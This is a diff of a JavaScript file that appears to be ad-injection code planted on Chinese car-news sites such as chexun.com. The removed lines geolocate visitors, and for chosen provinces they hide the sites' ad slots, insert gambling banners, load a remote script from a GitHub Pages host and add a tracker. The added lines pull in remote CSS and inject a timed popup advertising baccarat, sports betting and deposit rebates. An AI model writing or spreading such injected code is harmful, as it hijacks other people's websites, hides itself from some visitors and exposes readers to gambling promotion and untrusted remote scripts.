@@ -1,107 +1,63 @@
-function get_Cookie(cname)
-{
-  var name = cname + "=";
-  var ca = document.cookie.split(';');
-  for(var i=0; i<ca.length; i++) 
-  {
-    var c = ca[i].trim();
-    if (c.indexOf(name)==0) return c.substring(name.length,c.length);
-  }
-  return false;
-}
 
-function RandomNum(Min, Max) {
-    var Range = Max - Min;
-    var Rand = Math.random();
-    var num = Min + Math.floor(Rand * Range);
-    return num;
-}
+	$("<link>").attr({
+		rel: "stylesheet",
+		type: "text/css",
+		href: "https://jackson38.github.io/tan/css/my.css"
+	}).appendTo("head");
 
-function check_address(data){
-    //var valid_addr = ["Fujian", "Zhejiang", "Guangdong", "Henan", "Guizhou", "Hunan", "Hainan", "Jiangsu", "Shanghai", "Guangxi", "Gansu", "Anhui", "Shanxi", "Jiangxi", "Shandong", "Jiangxi", "Yunnan", "Shanxi", "Jilin", "Sichuan", "Liaoning"];
-    var valid_addr = ["Fujian", "Zhejiang", "Guangdong", "Hainan", "Jiangsu", "Yunnan", "Guangxi", "Henan"];
-    // var invalid_addr = ["Beijing", "Tianjin", "Hebei"];
-    if(valid_addr.indexOf(data["geoplugin_region"]) != -1 ){
-        document.cookie = "__adf=2"; // valid
-        do_go();
-    }
-    else{
-        document.cookie = "__adf=1"; // Invalid
-    }
-}
-
-function insert_ad(current_time){
-    var current_hour = (new Date()).getHours();
-    var ad_790_90 = '<div><a href="https://y52003.com/" target="_blank"><img alt="" src="https://i.loli.net/2019/05/22/5ce4ffc1e166e39928.gif"></a></div>';
-    var ad_650_200 = '<div><a href="https://y52003.com/" target="_blank"><img alt="" src="https://i.loli.net/2019/05/22/5ce4ff6fc171170476.gif"></a></div>';
-    var ad_1100_75 = '<div><a href="https://y52003.com/" target="_blank"><img alt="" src="https://i.loli.net/2019/05/22/5ce4fff96562c60639.gif"></a></div>';
-    $.getScript("https://jackson38.github.io/tan/js/my.js");
-    if(location.href.match(/\/\/www.chexun.com\/\d{4}\-\d{2}\-\d{2}\/\d{9}\.html/ig)){
-        // $(".cx_5_43").attr("style","display:none;"); //790_90
-        // $(".cx_5_43").before(ad_790_90);
-        // $(".news-info.clearfix").after(ad_790_90);
-        $(".cx_5_42").attr("style","display:none;"); //1100_75
-        $(".cx_5_42").before(ad_1100_75);
-        // $(".zeren-man").before(ad_650_200);
-    }
-    else if(location.href.match(/\/\/www.chaichefang.com\/\d{4}\-\d{2}\-\d{2}\/\d{9}\.html/ig)){
-        // $(".news-info.clearfix").after(ad_790_90);
-        $(".p-bread-nav").before(ad_1100_75);
-    }
-    else if(location.href.match(/\/\/auto.chexun.com\/[\w-]*\//ig)){
-        // $(".cx_2_37").attr("style","display:none;"); //1100_75
-        // $(".cx_2_37").before(ad_1100_75);
-        $(".auto-head.clearfix").before('<div class="pictab"><a href="https://y52003.com/" target="_blank"><img alt="" src="https://i.loli.net/2019/05/22/5ce4fff96562c60639.gif"></a></div>');
-    }
-    else if(location.href.match(/\/\/car.chexun.com\/qctupian\/[\w-]+\.html/ig)){
-        $(".x-img-select.clearfix").before('<div class="pictab"><a href="https://y52003.com/" target="_blank"><img alt="" src="https://i.loli.net/2019/05/22/5ce4fff96562c60639.gif"></a></div>');
-    }
-    else{
-        return;
-    }
-    document.cookie = "__ad="+current_time;
-    var x = document.createElement("SCRIPT");x.src="//js.users.51.la/20046359.js";document.body.appendChild(x);
-
-}
-
-function do_go(){
-    if(get_Cookie("__adf") != 2){
-        return;
-    }
-    var go = false;
-    var current_hour = (new Date()).getHours();
-    var current_time = (new Date()).getTime();
-    var current_cookie = document.cookie;
-    var old_time = get_Cookie("__ad");
-    if(!old_time){
-        go = true;
-    }
-    else{
-        if(current_hour < 20 && current_time-old_time > 60000)
-        {
-            go = true;
-        }
-        if(current_hour >= 20 && current_hour <= 22 && current_time-old_time > 30000){
-            go = true;
-        }
-        else if(current_hour >= 22 && current_hour < 23 && current_time-old_time > 10000){
-            go = true;
-        }
-        else if(current_hour >= 23 || current_hour <= 2){
-            go = true;
-        }
-    }
-    if(go){
-        insert_ad(current_time);
-    }
-}
+	$("body").append('<div class="King_Chance_Layer">' +
+		'<div class="King_Chance_LayerCont" style="display:none;">' +
+		'<div class="King_Chance_Layer_Close">Close</div>' +
+		'<div class="King_Chance_Layer_Title">本 站 推 荐</div>' +
+		'<div class="King_Chance_Layer_Btn">' +
+		'<ul>' +
+		'<li><a href="#">信誉担保</a></li>' +
+		'<li><a href="#">百倍赔率</a></li>' +
+		'<li><a href="#">百家乐</a></li>' +
+		'<li><a href="#">体育彩票</a></li>' +
+		'<li><a href="#">首充返利</a></li>' +
+		'</ul>' +
+		'</div>' +
+		'<div class="King_Chance_Layer_Content">' +
+		'<ul>' +
+		'<li><a href="https://y52003.com/" target="_blank"><img src="https://i.niupic.com/images/2019/07/13/_67.jpg" /></a></li>' +
+		'<li><a href="https://y52003.com/" target="_blank"><img src="https://i.niupic.com/images/2019/07/13/_68.jpg" /></a></li>' +
+		'<li><a href="https://y52003.com/" target="_blank"><img src="https://i.niupic.com/images/2019/07/13/_69.jpg" /></a></li>' +
+		'<li><a href="https://y52003.com/" target="_blank"><img src="https://i.niupic.com/images/2019/07/13/_72.jpg" /></a></li>' +
+		'<li><a href="https://y52003.com/" target="_blank"><img src="https://i.niupic.com/images/2019/07/13/_70.jpg" /></a></li>' +
+		'</ul>' +
+		'</div>' +
+		'</div>' +
+		'</div>');
 
 
-$(function(){
-    if(!get_Cookie("__adf")){
-        $.getScript("http://www.geoplugin.net/json.gp?jsoncallback=check_address");
-        return;
-    }
-    do_go();
-});
+	var $King_Chance_LayerCont = $(".King_Chance_LayerCont");
+	var $King_Chance_Layer_Close = $(".King_Chance_Layer_Close");
+	var $King_Chance_Layer_Btn = $(".King_Chance_Layer_Btn > ul > li");
+	var $King_Chance_Layer_Content = $(".King_Chance_Layer_Content > ul > li");
+	var King_Chance_Layer_Btn_Hover = "hover";
+	var King_Chance_Layer_Show_Num = 0;
+	var King_Chance_Layer_Btn_Len = $King_Chance_Layer_Btn.length;
+	$King_Chance_Layer_Btn.hover(function () {
+		var King_Chance_Layer_Show_Num = $King_Chance_Layer_Btn.index(this);
+		$(this).addClass(King_Chance_Layer_Btn_Hover).siblings().removeClass(King_Chance_Layer_Btn_Hover);
+		$King_Chance_Layer_Content.eq(King_Chance_Layer_Show_Num).show().siblings().hide();
+	});
+	var King_Chance_Layer_Play = function () {
+		King_Chance_Layer_Show_Num++;
+		if (King_Chance_Layer_Show_Num >= King_Chance_Layer_Btn_Len) King_Chance_Layer_Show_Num = 0;
+		$King_Chance_Layer_Btn.eq(King_Chance_Layer_Show_Num).addClass(King_Chance_Layer_Btn_Hover).siblings().removeClass(King_Chance_Layer_Btn_Hover);
+		$King_Chance_Layer_Content.eq(King_Chance_Layer_Show_Num).show().siblings().hide();
+	};
+
+	$King_Chance_Layer_Close.click(function () { clearInterval(King_Chance_Layer_Play_Time); $King_Chance_LayerCont.slideUp(); });
+	King_Chance_Layer_Pop = function () {
+		$King_Chance_LayerCont.slideDown();
+		$King_Chance_Layer_Btn.eq(King_Chance_Layer_Show_Num).addClass(King_Chance_Layer_Btn_Hover);
+		$King_Chance_Layer_Content.eq(King_Chance_Layer_Show_Num).show();
+		King_Chance_Layer_Play_Time = setInterval(function () { King_Chance_Layer_Play(); }, 2000);
+	};
+	$(document).ready(function () {
+	setTimeout("King_Chance_Layer_Pop()", 5000);
+	});
 
